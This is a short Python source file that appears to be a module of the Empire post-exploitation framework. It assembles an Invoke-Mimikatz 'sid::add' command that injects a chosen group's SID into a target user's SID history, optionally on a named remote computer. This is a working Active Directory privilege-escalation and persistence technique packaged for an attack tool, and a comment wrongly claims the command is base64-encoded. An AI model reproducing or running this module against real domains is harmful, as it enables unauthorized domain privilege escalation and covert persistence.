from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # build the custom command with whatever options we want
        command = f'"sid::add /sam:{params["User"]} /new:{params["Group"]}"'
        command = f"-Command '{command}'"
        if params.get("ComputerName"):
            command = f'{command} -ComputerName "{params["ComputerName"]}"'
        # base64 encode the command to pass to Invoke-Mimikatz
        script_end = f"Invoke-Mimikatz {command};"

        return script, script_end
